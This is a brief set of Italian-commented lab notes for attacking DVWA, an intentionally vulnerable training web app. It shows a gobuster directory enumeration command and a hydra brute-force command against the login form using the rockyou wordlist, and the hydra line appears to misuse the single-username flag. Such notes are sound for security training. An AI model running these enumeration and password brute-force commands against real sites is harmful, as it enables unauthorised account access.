#Enumerazione di un sito web
#IP : http://dvwa/login.php

#Enumeriamo gli url tramite gobuster
gobuster dir -u http://dvwa -w /usr/share/wordlists/dirb/common.txt

#Possiamo anche provare a fare un attacco brute force tramite hydra
hydra -l /usr/share/dirb/wordlists/common.txt -P /usr/share/wordlists/rockyou.txt http-post-form://dvwa/login.php:username=^USER^&password=^PASS^:F=Login failed


